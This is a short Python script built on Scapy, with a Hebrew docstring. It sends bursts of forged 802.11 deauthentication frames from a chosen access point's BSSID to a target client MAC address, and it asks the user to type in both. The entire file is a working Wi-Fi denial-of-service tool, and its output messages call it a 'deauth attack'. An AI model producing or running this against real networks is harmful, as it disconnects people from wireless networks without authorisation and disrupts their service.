from scapy.all import *
import time

def send_deauth_to_client(interface, bssid, target_mac, count=100, interval=0.1):
    """
    שולח חבילות Deauthentication מיידית ללקוח נתון מול BSSID מסוים.
    """
    if not bssid or not target_mac:
        print("❌ BSSID and client MAC are required.")
        return

    print(f"[!] Sending deauth packets to {target_mac} from BSSID {bssid} on interface {interface}...")
    pkt = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    sendp(pkt, iface=interface, count=count, inter=interval, verbose=1)
    print("✅ Deauth attack completed.")

# Example usage
if __name__ == "__main__":
    INTERFACE = "wlp2s0"
    BSSID = input("📶 Enter target AP BSSID: ").strip()
    CLIENT_MAC = input("👤 Enter target client MAC: ").strip()
    send_deauth_to_client(INTERFACE, BSSID, CLIENT_MAC)
